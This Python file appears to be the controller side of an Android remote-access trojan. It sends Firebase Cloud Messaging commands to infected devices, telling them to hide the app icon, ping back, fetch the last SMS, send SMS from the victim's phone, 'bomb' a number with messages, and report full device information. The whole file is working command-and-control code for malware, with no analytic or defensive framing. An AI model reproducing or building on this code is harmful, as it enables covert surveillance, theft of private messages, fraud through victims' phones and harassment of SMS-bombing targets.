from os import system
try:
    from requests import Session
except ModuleNotFoundError:
    system("pip install requests")
try:
    from info import Info
except ModuleNotFoundError:
    raise ModuleNotFoundError("File info.py was Not Found !")
INFO = Info()
class FireBase:
    def __init__(self):
        self.Session = Session()
        self.Api = "https://fcm.googleapis.com/fcm/send"
        self.Header = {
            "Authorization" : "key={}".format(INFO.APIKEY),
            "Content-Type" : "application/json;charset=UTF-8",
        }
        self.Topic = INFO.topic
    def __SendHideOne__(self , androidid):
        try:
            self.data = {
                "data" : {"Action" : "HideOne" , "androidid" : str(androidid)},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendHideAll__(self):
        try:
            self.data = {
                "data" : {"Action" : "HideAll"},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendPingOne__(self , androidid):
        try:
            self.data = {
                "data" : {"Action" : "PingOne" , "androidid" : str(androidid)},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendPingAll__(self):
        try:
            self.data = {
                "data" : {"Action" : "PingAll"},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendLastSms__(self , androidid):
        try:
            self.data = {
                "data" : {"Action" : "LastSms" , "androidid" : str(androidid)},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendSms__(self , androidid , Phone , Message):
        try:
            self.data = {
                "data" : {"Action" : "SendSms" , "androidid" : str(androidid) , "Phone" : str(Phone) , "Message" : str(Message)},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendBomber__(self , Phone , Message):
        try:
            self.data = {
                "data" : {"Action" : "Bomber" , "Phone" : str(Phone) , "Message" : str(Message)},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error
    def __SendFullInfo__(self , androidid):
        try:
            self.data = {
                "data" : {"Action" : "FullInfo" , "androidid" : str(androidid)},
                "to" : "/topics/{}".format(self.Topic),
            }
            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
            if self.Req.json()["message_id"] != "":
                return True
            else:
                return False
        except Exception as Error:
            return Error


















        
